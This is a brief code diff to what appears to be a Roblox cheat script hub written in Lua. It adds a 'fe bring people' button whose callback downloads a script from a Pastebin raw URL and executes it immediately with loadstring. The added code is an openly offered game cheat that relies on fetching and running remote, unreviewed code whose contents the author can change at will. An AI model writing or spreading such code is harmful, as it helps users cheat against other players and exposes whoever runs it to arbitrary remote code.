@@ -685,6 +685,13 @@ game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.Jo
 	end
 })
 
+OtherTab:AddButton({
+	Name = "fe bring people",
+	Callback = function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/iThJgCAS'),true))()
+	end
+})
+
 local tsbTab = Window:MakeTab({
 	Name = "[💪] Battleground",
 	Icon = "rbxassetid://18186948969",
